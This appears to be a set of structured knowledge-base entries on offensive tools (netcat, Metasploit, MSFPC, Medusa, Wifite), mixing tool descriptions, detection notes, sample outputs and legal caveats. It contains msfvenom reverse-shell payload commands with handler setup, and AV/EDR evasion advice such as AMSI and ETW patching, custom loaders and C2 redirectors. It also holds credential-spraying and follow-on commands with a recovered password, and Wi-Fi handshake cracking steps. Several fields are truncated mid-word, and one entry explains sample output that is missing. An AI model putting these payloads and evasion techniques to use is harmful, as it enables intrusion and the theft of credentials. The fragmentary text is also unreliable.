CLOUD CONSIDERATION: In AWS, Azure, and GCP environments, outbound connections from EC2/VM instances to external IPs are logged in VPC Flow Logs, NSG Flow Logs, and Cloud Audit Logs respectively. A netcat reverse shell from a cloud instance to an external attacker IP will appear as an outbound flow with a non-standard destination port. Cloud providers' abuse teams monitor for this pattern and may suspend the account or alert the asset owner independently of any SIEM the client operates. Ensure your engagement authorization explicitly covers cloud-hosted assets and that the client has notified their cloud provider if required by their terms of service.
false_positives: FILTERED vs CLOSED confusion: When a stateful firewall silently drops packets (no RST, no ICMP port-unreachable), netcat with '-z' will hang until the '-w' timeout expires and then report nothing — the port appears neither open nor closed. Operators frequently misread this as 'the service isn't running' when the service is running but a firewall is in the path. Always pair netcat port checks with nmap '--reason' output to distinguish 'filtered' from 'closed'.

OpenBSD netcat vs GNU netcat vs ncat: There are three common netcat implementations with different flag behavior. OpenBSD netcat (default on Debian/Ubuntu/macOS) does NOT support '-e'. GNU netcat (netcat-traditional package) supports '-e' but uses '-p' differently. Ncat (from nmap) supports '-e', '--ssl', and '--proxy'. Running 'nc -e /bin/bash ...' on a system with OpenBSD netcat will silently fail or print a usage error — the reverse shell will not spawn, but the operator may not notice if they're not watching the listener carefully.

UDP mode (-u) gives no confirmation of delivery: Unlike TCP, UDP has no handshake. 'nc -u host port' will appear to 'succeed' (no error) even if the port is closed, the host is down, or a firewall is dropping packets. The '-z' flag combined with '-u' is essentially meaningless for confirming a service is listening — you need an application-layer response to confirm UDP service presence.

Banner grabbing timing: Some services (SMTP, FTP, SSH) send a banner immediately on connect; others (HTTP) require you to send a request first. If you connect with 'nc -nv host 25' and immediately close the connection (or use '-z'), you may miss the banner entirely or receive a partial banner if the service is slow. The '-w' timeout applies to idle time, not total connection time, so a slow banner on a loaded server may be truncated.

IPv6 vs IPv4 ambiguity: On dual-stack hosts, 'nc host port' may resolve to IPv6 and connect via IPv6 even when you intend IPv4. The resulting connection will appear in logs under the IPv6 address, not the IPv4 address you expected to test. Use '-4' or '-6' flags (where supported by your netcat variant) or use the explicit IPv4 address with '-n' to avoid DNS-driven address family selection surprises.

msfconsole.description: Interactive console for the Metasploit Framework. Primary interface for module selection, payload generation, exploit execution, and session management. Every r
msfconsole.teach_intro: msfconsole is the cockpit of Metasploit. From a single prompt you load exploits (use exploit/multi/handler), generate payloads (msfvenom), open Meterpreter sessions, run post-exploitation modules, and pivot. Most students learn it by typing 'search ms17_010' and chasing EternalBlue against a vulnerable Windows 7 box, then graduate to building custom modules in Ruby. Mastery means knowing the Metasploit module taxonomy cold (exploits, auxiliaries, post, encoders, nops, payloads) and treating it as a Ruby framework you can extend, not a button-press kit.

msfpc.description: Wrapper around msfvenom that auto-generates payloads for multiple platforms/architectures with one command. Useful for engagements where you need 10 payload var
msfpc.teach_intro: MSFPC asks five questions (target OS, payload type, LHOST, LPORT, output format) and emits the msfvenom command + handler resource script. Good for beginners learning the payload taxonomy. Real red teamers eventually drop it for direct msfvenom one-liners or custom builders (Donut, Sliver implant generators) because MSFPC's output is signature-rich and AV-flagged everywhere.
opsec_notes: BEGINNER NOISE: Every payload MSFPC generates is compiled from well-known msfvenom templates. AV engines (Windows Defender, Malwarebytes, ClamAV) have static signatures for the default Meterpreter stubs — dropping the raw output to disk on any modern Windows host will trigger an immediate quarantine event. The file write itself is the detection, before execution ever occurs.

CONCRETE ARTIFACT — DEFENDER SEES: msfvenom-generated PE payloads produce a characteristic PE header entropy pattern (high entropy .text section, ~7.8 bits/byte) that CrowdStrike Falcon's ML engine scores as malicious at rest. Falcon logs this under 'Prevention: ML-based PE analysis' with the SHA256 of the dropped file. The defender sees this in the Falcon console under Detections > Prevention Events before the payload runs.

CUTTING-EDGE 2025-2026 — PROCESS TREE: When a Meterpreter reverse_tcp payload executes, it spawns a child process (e.g., cmd.exe or powershell.exe) from an unusual parent (e.g., explorer.exe or a document reader). SentinelOne's Deep Visibility and Defender for Endpoint's process tree telemetry flag this parent-child anomaly via ETW-TI (Event Tracing for Windows — Threat Intelligence provider). The specific ETW provider is Microsoft-Windows-Threat-Intelligence, and the callback fires on VirtualAllocEx + WriteProcessMemory sequences characteristic of Meterpreter's reflective injection.

CUTTING-EDGE 2025-2026 — AMSI + ETW BYPASS SHELF LIFE: MSFPC's default payloads include no AMSI or ETW bypass. On Windows 11 22H2+ with Defender for Endpoint Plan 2, AMSI scans the in-memory payload buffer at load time via AmsiScanBuffer. The default Meterpreter stager is caught at this layer even if you bypassed on-disk AV. Modern operators use custom loaders (Donut + SRDI, Havoc/Sliver implant generators with per-build obfuscation) that patch AMSI and ETW-TI before reflective loading — MSFPC does not do this.

CONCRETE ARTIFACT — NETWORK FLOW: The default Meterpreter reverse_tcp handler listens on a single LPORT and produces a distinctive TLS handshake pattern (when using reverse_https) with a self-signed certificate whose Subject CN defaults to 'MetasploitSelf-Signed'. Network-based NDR tools (Darktrace, ExtraHop, Vectra) fingerprint this certificate via JA3/JA3S hashes. The JA3S hash for the default Metasploit HTTPS handler has been in public threat intel feeds since 2019 and is blocked at the perimeter in most mature environments.

ADVANCED OPSEC — HANDLER ATTRIBUTION: Running the msfpc-generated resource script starts a multi/handler on your attack box. If your LHOST is a direct VPS IP, that IP is embedded in the payload binary and recoverable by any defender who sandboxes the file. Use a redirector (socat, nginx stream proxy, or a cloud function relay) between the payload's hardcoded LHOST and your actual C2 listener so the embedded IP is a sacrificial relay, not your real infrastructure.

sample_outputs.scenario: Beginner: Generate a Windows x64 reverse TCP Meterpreter EXE for a lab VM. Student is learning the payload taxonomy and wants to see what MSFPC produces before running msfvenom manually.
sample_outputs.output:
[*] MSFPayloadCreator (MSFPC) v1.4.5
[*] Target OS   : windows
[*] Payload type : meterpreter/reverse_tcp
[*] LHOST        : 10.10.10.50
[*] LPORT        : 4444
[*] Format       : exe
[+] Generating payload...
[+] msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f exe -o /root/windows-meterpreter-staged-reverse-tcp-4444.exe
[+] Payload saved : /root/windows-meterpreter-staged-reverse-tcp-4444.exe
[+] File size    : 73802 bytes
[+] Handler RC   : /root/windows-meterpreter-staged-reverse-tcp-4444-exe.rc
[*] Run handler  : msfconsole -r /root/windows-meterpreter-staged-reverse-tcp-4444-exe.rc
sample_outputs.explanation: MSFPC resolved 'windows' to the windows/x64/meterpreter/reverse_tcp payload and emitted both the msfvenom command and a handler resource script. The student should read the msfvenom line carefully — this is the actual command they'd run manually next time. Key fields: '-p' is the payload module path, 'LHOST/LPORT' are the callback address and port baked into the binary, '-f exe' is the output format, '-o' is the output file. The .rc file is a Metasploit resource script that auto-configures multi/handler with matching payload, LHOST, and LPORT. Next steps: (1) Understand staged vs stageless — this is a staged payload (the small stager fetches the full Meterpreter stage from the handler at runtime); try 'msfpc windows 10.10.10.50 4444 stageless' to see the difference in file size. (2) Upload the EXE to VirusTotal in a lab context to see how many engines flag it — this teaches why raw msfvenom output is unusable against real targets. (3) Graduate to direct msfvenom one-liners once the taxonomy is understood.

sample_outputs.scenario: Advanced: Red team engagement against a hardened Windows 11 24H2 target with CrowdStrike Falcon deployed. Operator uses MSFPC only to understand the baseline payload structure, then documents why they will NOT use it and what they will use instead. Demonstrates the tool's educational value and its operational ceiling.
sample_outputs.output:
[*] MSFPayloadCreator (MSFPC) v1.4.5
[*] Target OS   : windows
[*] Payload type : meterpreter/reverse_https
[*] LHOST        : 10.10.10.50
[*] LPORT        : 443
[*] Staged       : false (stageless)
[*] Format       : exe
[+] Generating payload...
[+] msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.10.50 LPORT=443 -f exe -o /root/windows-meterpreter-stageless-reverse-https-443.exe
[+] Payload saved : /root/windows-meterpreter-stageless-reverse-https-443.exe
[+] File size    : 250368 bytes
[+] Handler RC   : /root/windows-meterpreter-stageless-reverse-https-443-exe.rc
[*] Run handler  : msfconsole -r /root/windows-meterpreter-stageless-reverse-https-443-exe.rc
[!] WARNING: Stageless payloads are larger and more signatured. Consider encoding.
sample_outputs.explanation: The stageless HTTPS payload embeds the full Meterpreter DLL (250KB vs 73KB staged) — larger attack surface for static AV and higher entropy. On a Falcon-protected Win11 24H2 host this binary will be quarantined on write by Falcon's ML prevention before execution. The operator's decision tree from here: (1) REJECT this payload for the live engagement. Document it in the report as 'baseline msfvenom output — caught by Falcon ML at rest.' (2) Switch to Sliver (sliver-server + sliver-client) with per-implant certificate pinning and a domain-fronted HTTPS profile — Sliver's implant generator produces unique per-build binaries that defeat static signatures. (3) Wrap any shellcode in a custom loader using Donut (donut -i meterpreter.exe -o shellcode.bin) + a C# or Nim loader that patches AMSI via hardware breakpoint (not the classic AmsiScanBuffer patch, which is ETW-monitored) before reflective loading. (4) Use a redirector chain: payload -> CDN/domain-front -> nginx reverse proxy -> actual Metasploit/Sliver listener, so the embedded LHOST is a sacrificial IP. (5) If Meterpreter is required by the engagement scope, use the Metasploit 'evasion' module framework (use evasion/windows/windows_defender_exe) which applies template obfuscation — still not Falcon-proof in 2025 but better than raw msfvenom output.

legal_notes: US CFAA (18 U.S.C. § 1030): Generating a payload with MSFPC and delivering it to any system you do not own or have explicit written authorization to test constitutes unauthorized access. The payload generation itself is legal; the delivery is the criminal act. 'I was just testing' is not a defense — CFAA does not require intent to cause damage, only intent to access without authorization.

RULES OF ENGAGEMENT — PAYLOAD SCOPE: Your engagement SOW must explicitly authorize payload delivery and execution, not just scanning. Many scoped engagements authorize network enumeration but NOT code execution. Confirm your ROE covers: (a) payload delivery method (email, USB, web), (b) target host IP/hostname, (c) acceptable payload types (no ransomware-style persistence even in test), and (d) handler infrastructure IP (your LHOST must be in scope or explicitly whitelisted by the client's firewall team).

CLOUD / MODERN ENVIRONMENT CONSIDERATION: If the target environment uses Azure Defender for Cloud or AWS GuardDuty, the outbound callback from a Meterpreter payload to an external LHOST will generate a GuardDuty finding (Backdoor:EC2/C&CActivity.B or similar) or an Azure Defender alert. These alerts may trigger an automated incident response (isolate VM, revoke credentials) that is outside your control and could disrupt production workloads. Confirm with the client whether automated response playbooks are active before delivering payloads in cloud-hosted environments.
false_positives: MSFPC may silently select a 32-bit payload (windows/meterpreter/reverse_tcp) instead of the 64-bit variant (windows/x64/...) depending on version and how the OS argument is parsed. The resulting EXE will fail to execute on a 64-bit-only process context (e.g., injected into a 64-bit process via migrate). Always verify the payload path in the emitted msfvenom command — 'windows/x64/' vs 'windows/' is the tell.

The handler resource script MSFPC generates sets ExitOnSession to false by default in some versions, meaning the handler stays open for multiple sessions — but in other versions it defaults to true, closing after the first callback. If you're running a phishing campaign expecting multiple victims, verify the .rc file's ExitOnSession value before launching, or the handler will die after the first shell.

MSFPC's 'stageless' flag handling is inconsistent across versions. In some builds, passing 'stageless' produces a staged payload anyway (windows/x64/meterpreter/reverse_tcp instead of windows/x64/meterpreter_reverse_tcp — note the underscore vs slash). The file size in the output is the reliable indicator: staged payloads are typically under 100KB, stageless are 200KB+. Verify the payload module path in the msfvenom command, not just the filename.

On Kali 2024+ and Parrot OS 6+, msfvenom's underlying template library may produce a payload that fails to execute on Windows 11 24H2 due to changes in the PE loader's CFG (Control Flow Guard) enforcement. The payload generates without error, the handler starts, but no session arrives. This is not a network issue — it's a silent execution failure on the target. Test in a VM before live delivery.

MSFPC does not validate that LHOST is reachable from the target network. If you specify a private RFC1918 address as LHOST but the target is on a different network segment (or the internet), the payload will execute on the victim, attempt to call back to an unreachable IP, and silently fail. The operator sees no session and no error. Always verify LHOST is the correct egress-facing IP for the target's network path.

medusa.description: Parallel network login brute-forcer. Competes with hydra for credential-spraying workloads. Module support for SSH, FTP, SMB, RDP, HTTP-AUTH, MySQL, PostgreSQL,
medusa.teach_intro: Medusa runs many concurrent host/service threads (default 16) where hydra goes serial per host. For a /24 sweep with one user/password combo, medusa often finishes 3-5x faster. Syntax differs from hydra: medusa -h target -u user -P pass.txt -M ssh. Both noisy: every failed attempt is a Windows EID 4625 or syslog auth.log entry. Use only on engagements where account lockout policy is known and you've throttled below the threshold.
opsec_notes: BEGINNER NOISE: Every failed login attempt generates a discrete authentication failure log entry on the target. On Linux/Unix targets this is a line in /var/log/auth.log (or /var/log/secure on RHEL-family) with 'Failed password' or 'Invalid user'. On Windows, every failed attempt fires EID 4625 (failed logon) in the Security event log, with logon type 3 (network) and the source IP visible in plaintext. A /24 sweep with even one password guess produces 254 EID 4625 events in seconds — trivially detectable by any SIEM with a default rule.

CONCRETE ARTIFACT — NETWORK LAYER: Medusa's parallel threads produce a burst of TCP SYN packets to the target service port (e.g., 22/tcp for SSH, 445/tcp for SMB) from the same source IP in a very short window. NetFlow/IPFIX collectors and NDR platforms (Darktrace, ExtraHop, Vectra AI) will flag this as a horizontal or vertical scan pattern. The connection-per-second rate from a single source to a single destination port is a high-fidelity detection signal — no authentication failure needed.

CUTTING-EDGE 2025-2026 — CrowdStrike Falcon Behavioral Detection: Falcon's Identity Protection module (formerly Preempt) correlates authentication telemetry from domain controllers in near-real-time. When Medusa sprays SMB or RDP credentials against a domain-joined host, the DC logs Kerberos pre-authentication failures (EID 4771) or NTLM failures (EID 4776) alongside the source workstation name. Falcon OverWatch and the Identity Protection dashboard surface these as 'brute force' behavioral IOAs within minutes, even if no account locks out, because the velocity of distinct authentication attempts from one source exceeds learned baselines.

CUTTING-EDGE 2025-2026 — Microsoft Defender for Identity (MDI) / Entra ID Protection: In environments with MDI deployed (sensor on every DC), Medusa's SMB/Kerberos sprays trigger the 'Suspected Brute Force Attack (Kerberos, NTLM)' alert with HIGH severity. MDI correlates EID 4771 (Kerberos pre-auth failure) and EID 4776 (NTLM validation failure) across all DCs simultaneously. In hybrid environments, Entra ID Protection's 'Unfamiliar sign-in properties' and 'Password spray' risk detections fire when the same credential pair is attempted against cloud-synced accounts, even if the spray originates on-prem. Throttling below lockout threshold does NOT evade MDI — velocity alone triggers it.

ACCOUNT LOCKOUT MATH IS NOT OPTIONAL: Before running Medusa against any domain environment, you must know three values from the domain's Default Domain Policy: (1) Account Lockout Threshold (e.g., 5 attempts), (2) Observation Window (e.g., 30 minutes), and (3) Lockout Duration. Medusa's -t (tasks per host) and -T (total threads) flags must be tuned so that attempts-per-account-per-window stay below the threshold. Locking out accounts is a scope violation on most engagements AND a denial-of-service against production users — it will end your engagement and potentially your career.

EVASION CONSIDERATION — SLOW AND LOW: To reduce detection fidelity, operators in 2025 use Medusa with -t 1 (one task per host) combined with deliberate inter-attempt delays via wrapper scripts or proxychains with rotating SOCKS5 proxies. However, MDI and modern NDR platforms now baseline 'normal' authentication rates per source and flag deviations even at low velocity if the source has no prior authentication history with the target. True evasion requires blending into existing authentication patterns — which means credential spraying from a compromised internal host with a legitimate authentication history, not from your attack box.

The -T 8 flag runs 8 parallel host threads while -t 1 keeps attempts per host serial — this is the lockout-safe configuration. The -O flag writes all results to a file for later parsing. CRITICAL OBSERVATION: svc_backup is a service account — these frequently have elevated privileges, no interactive logon restrictions, and are often excluded from lockout policies. NEXT STEPS: (1) Use CrackMapExec ('crackmapexec smb 10.10.1.44 -u svc_backup -p Winter2025! --shares') to enumerate accessible shares and check if the account has local admin. (2) Run BloodHound ingestion ('bloodhound-python -u agarcia -p Winter2025! -d corp.local -c All') to map AD paths from these accounts. legal_notes: US CFAA BOUNDARY: Medusa sends authentication attempts to remote services. Under 18 U.S.C. § 1030(a)(2) and (a)(5), unauthorized access attempts — even failed ones — constitute 'unauthorized access' to a protected computer. A signed Rules of Engagement (RoE) document specifying the exact IP ranges, services, and credential-testing activities authorized is mandatory before running Medusa against any target. Verbal authorization is not sufficient and will not protect you in a CFAA prosecution.

SCOPE AND RoE SPECIFICS: Your engagement authorization must explicitly permit 'credential brute-forcing' or 'authentication testing' — a generic 'penetration test' authorization may not cover it. Confirm: (1) Are all target IPs in the authorized scope list? (2) Does the RoE permit account lockout risk? (3) Are there any accounts explicitly excluded (e.g., executive accounts, service accounts tied to production systems)? Spraying a host that resolves to an out-of-scope IP via DNS is still a scope violation even if you targeted it by hostname.

CLOUD AND HYBRID AD CONSIDERATION: In environments with Entra ID (Azure AD) hybrid identity, on-premises credential spraying against domain-joined hosts may trigger cloud-side risk detections and lock cloud accounts — even if the on-prem account lockout threshold is not reached. Microsoft's Entra ID Protection can enforce 'smart lockout' independently of on-prem GPO. Confirm with the client whether hybrid identity is in scope and whether cloud account lockout is an acceptable risk before spraying any domain credentials.
false_positives: SMB MODULE NTLM NEGOTIATION FAILURES: The 'smbnt' module will report connection errors or false negatives against Windows hosts that have enforced SMB signing and NTLMv2-only authentication with specific security policies. A host may reject the Medusa SMB handshake at the protocol negotiation layer and return an error that looks like 'host unreachable' or 'connection refused' — not a credential failure. Always verify SMB reachability with 'crackmapexec smb <target>' before concluding Medusa's errors mean the host is down.

LOAD BALANCERS AND REVERSE PROXIES: When targeting web services (HTTP-AUTH module), Medusa may authenticate successfully against one backend node and fail against another due to session affinity or inconsistent credential stores. This produces intermittent [SUCCESS] results that cannot be reproduced — the credential appears valid in Medusa output but fails when you try to use it manually. Always manually verify every [SUCCESS] hit before treating it as confirmed access.

SSH BANNER GRAB TIMEOUTS: Medusa's SSH module will occasionally log a failed attempt for a host that is actually up and accepting SSH connections, if the SSH banner response is slow (e.g., due to DNS reverse-lookup delays on the server side). The attempt is logged as a failure or connection error, not as a credential failure. This causes false negatives — valid credentials on slow-responding hosts get skipped. Use -r (retry count) and -R (retry wait) flags to mitigate, and manually test any host that showed connection errors.

WINDOWS GUEST ACCOUNT BEHAVIOR: On some older or misconfigured Windows SMB targets, the Guest account or null sessions may cause Medusa to report [SUCCESS] for credentials that don't actually grant meaningful access — the SMB handshake completes but the session has no privileges. Always follow up a Medusa SMB success with 'crackmapexec smb <target> -u <user> -p <pass> --shares' to confirm actual share access and privilege level.

RDP NLA VS. CLASSIC RDP: Medusa's RDP module targets classic RDP (pre-Network Level Authentication). Against modern Windows hosts with NLA enforced (default since Server 2012 R2), Medusa's RDP module will fail to complete the authentication handshake and may report all attempts as failures or connection errors — not because the credentials are wrong, but because NLA requires a credential exchange before the RDP session is established, which Medusa's module does not fully implement. Use a tool with NLA support (e.g., hydra with rdp module or crowbar) for NLA-enforced targets.

wifite.description: Automated wireless auditor. Wraps airodump-ng, aircrack-ng, reaver, bully, hcxdumptool, and pyrit into a 'press one button, attack every nearby AP' workflow. Ta
wifite.teach_intro: Wifite is what a junior student runs while learning what each underlying tool does. After 30 minutes with wifite the same student should know: how to put a card in monitor mode (airmon-ng), how to capture a 4-way handshake (airodump-ng + aireplay-ng deauth), and how to crack the handshake (aircrack-ng with rockyou). Wifite automates ALL of that; understanding each layer means you can debug when the automation fails (driver issues, channel hopping, PMKID-capable APs vs handshake-only).
opsec_notes: Beginner noise floor: Wifite immediately puts your wireless card into monitor mode and begins broadcasting deauthentication frames (802.11 reason code 7) to every targeted AP. Any WIDS (Wireless Intrusion Detection System) — including consumer-grade Ubiquiti UniFi, Cisco Meraki, or Aruba ClearPass — will log and alert on deauth floods within seconds. This is the loudest possible wireless action short of a jammer.

Concrete defender artifact: Deauth attacks appear in WIDS logs as repeated 'Deauthentication flood from [your MAC]' events. On Cisco Meraki, this triggers an automatic rogue AP alert and can push a block rule to associated APs. On UniFi, Event ID 'wireless_deauth_attack' is written to the controller log at /var/log/unifi/server.log with your spoofed or real BSSID.

MAC address: Wifite randomizes the source MAC by default in recent versions, but the randomization is applied once at session start — it does not rotate mid-session. A defender correlating WIDS events over 30 minutes will see the same 'random' MAC consistently, making attribution straightforward. Use macchanger manually between target rotations if stealth matters.

2025-2026 cutting edge — PMKID capture vs. deauth: Modern WPA2/WPA3 APs (especially those running hostapd 2.10+ or Cisco IOS-XE 17.x) log PMKID probe requests at the AP level. Hcxdumptool PMKID captures (which Wifite invokes) do NOT require a connected client and leave no deauth frames, but they do generate anomalous EAPOL RSN IE frames that next-gen WIDS like Zebra AirDefense and Fortinet FortiWLM flag as 'PMKID harvesting attempt' in their 2024+ signature sets.

2025-2026 cutting edge — host-side telemetry: On the attacker's own machine, Wifite spawns child processes (airmon-ng, airodump-ng, aireplay-ng, hcxdumptool) in rapid succession. If the operator is running Wifite inside a pentest VM on a corporate host, CrowdStrike Falcon's process tree sensor will record these child process chains under the parent Python interpreter. The command-line arguments (--deauth, --pmkid, --wpa) have high entropy scores and match Falcon's 'wireless audit tool execution' behavioral indicator, which can trigger a detection even when the wireless interface is external USB.

Channel lock artifact: Wifite locks the wireless interface to a target channel during handshake capture. If your card was previously seen on channel 6 by a passive RF monitor (e.g., a spectrum analyzer or a neighboring AP in monitor mode), the sudden channel hop to 36 or 149 (5GHz) followed by sustained single-channel dwell is a behavioral fingerprint distinct from normal client roaming.

The handshake .cap file is saved to hs/ — this is the artifact you'd take to a GPU rig for heavy cracking if rockyou fails. The 'CLIENT: 1' column is critical: if no client is associated, deauth produces no handshake. Next steps: (1) if rockyou fails, escalate to hashcat with rule-based mutation (hashcat -m 22000 on the converted .hc22000 file); (2) examine the .cap in Wireshark to confirm all four EAPOL frames are present (a partial handshake will not crack); (3) try hcxdumptool PMKID capture as a clientless alternative if the AP supports it.

sample_outputs.scenario: Advanced: operator targets a WPA3-capable corporate AP in a lab environment. Goal is PMKID capture (clientless) plus fallback handshake, then offline crack with hashcat on a GPU rig. Card is wlan1, already confirmed capable of monitor mode and injection.
sample_outputs.output:
[+] enabling monitor mode on wlan1...
 [+] wlan1mon created
 [+] locking to channel 36 (5GHz)

  NUM  ESSID                 BSSID              CH  ENCR       POWER  WPS  CLIENT
  ---  --------------------  -----------------  --  ---------  -----  ---  ------
    1  CorpWifi-5G           DE:AD:BE:EF:CA:FE  36  WPA3/WPA2   -71db  no     3

 [+] (1/1) starting attacks against DE:AD:BE:EF:CA:FE (CorpWifi-5G)
 [+] attempting PMKID capture via hcxdumptool...
 [+] PMKID captured: hs/pmkid_DE-AD-BE-EF-CA-FE_CorpWifi-5G.16800

 [+] no wordlist specified, skipping local crack
 [+] session saved. run: hashcat -m 22000 hs/pmkid_DE-AD-BE-EF-CA-FE.hc22000 <wordlist>
sample_outputs.explanation: The --no-deauths flag suppresses the loudest WIDS trigger. The PMKID (Pairwise Master Key Identifier) is extracted from the first EAPOL frame without requiring a connected client — this is the Jens Steube 2018 technique that made clientless WPA2 cracking practical. The [!] warning is critical: WPA3 SAE (Simultaneous Authentication of Equals) uses a Dragonfly handshake that is NOT vulnerable to offline dictionary attack via PMKID — only the WPA2 RSNE (backward-compat mode) is crackable this way. If the AP enforces WPA3-only, this attack fails entirely. Next steps: (1) transfer .hc22000 to a hashcat GPU rig: hashcat -m 22000 -a 0 pmkid.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule; (2) if cracking fails, pivot to evil twin / Evilginx2 captive portal to harvest credentials in-browser; (3) check hcxdumptool pcapng for any EAP-PEAP or EAP-TTLS frames that indicate an enterprise auth fallback — those open a different attack surface via hostapd-wpe.

legal_notes: US CFAA (18 U.S.C. § 1030): Transmitting deauthentication frames against an AP you do not own or have explicit written authorization to test constitutes 'intentional transmission of a program, information, code, or command' that causes damage to a protected computer. This applies even if you never crack the password — the deauth flood itself is the violation. 'I was just scanning' is not a defense; deauth is an active attack.

Authorization scope: Wireless engagements require explicit written scope that names the specific BSSIDs (MAC addresses) and ESSIDs authorized for testing, the physical RF boundary (floor, building, campus), and the time window. A scope that says 'the corporate network at 123 Main St' does NOT authorize attacking neighboring tenant APs whose signals bleed into the same airspace — and Wifite will find and attack those by default unless you specify --bssid or --essid. Verify your target list against the authorized BSSID list before launching.

WPA3 and regulatory considerations: In some jurisdictions (EU NIS2 framework, UK Computer Misuse Act), capturing EAPOL frames from third-party APs — even passively — may constitute unauthorized interception of communications. PMKID capture is not passive; hcxdumptool sends probe and association frames to elicit the PMKID response. Confirm your engagement's legal jurisdiction and whether the client's authorization letter explicitly covers RF interception and active probing before using --pmkid against production APs.
false_positives: Hidden SSID APs appear in Wifite's scan with ESSID '<hidden>' and Wifite will still attempt to attack them. If the AP is a neighbor's network that happens to be on the same channel as your target, you can accidentally capture and crack a handshake from an out-of-scope AP. Always cross-reference BSSID against your authorized list — ESSID alone is not sufficient since SSIDs are trivially spoofed.

Wifite reports 'handshake captured' when it sees ANY EAPOL frames, including partial handshakes (only frames 1+2 of the 4-way, or 2+3). Aircrack-ng will then fail with 'no valid WPA handshakes found' and Wifite may report the crack as failed without explaining why. Always validate the .cap with: aircrack-ng hs/handshake_*.cap — if it reports '0 handshakes', you have a partial capture and need to re-deauth.

On APs with 802.11w (Management Frame Protection) enabled — mandatory in WPA3, optional in WPA2 — deauthentication frames from an attacker are cryptographically unsigned and will be silently dropped by the AP and associated clients. Wifite will report 'sending deauth frames' and appear to succeed, but no client will disconnect and no handshake will be generated. The tool gives no indication that MFP is active; you must check the AP's RSN IE in the beacon frame (visible in Wireshark: MFPC=1, MFPR=1).

Wifite's WPS attack mode (invoking Reaver or Bully) will report 'WPS enabled' for APs that have WPS in a locked state (WPS lock after 3 failed PINs). The tool will run for hours making zero progress and report no error — it simply keeps retrying against a locked WPS registrar. Check for WPS lock with: wash -i wlan0mon — if 'Lck' column shows 'Yes', WPS brute-force is futile until the lockout timer resets (often 60 minutes, sometimes permanent).

Driver compatibility is the most common source of false failure. Wifite will report 'failed to capture handshake' when the real cause is that the wireless driver does not support packet injection (e.g., many Realtek RTL8812AU chips require a specific out-of-tree driver build). Test injection capability first with: aireplay-ng --test wlan0mon. If injection test fails, no amount of Wifite flags will produce a handshake — the tool's error messages do not distinguish driver failure from genuine attack failure.
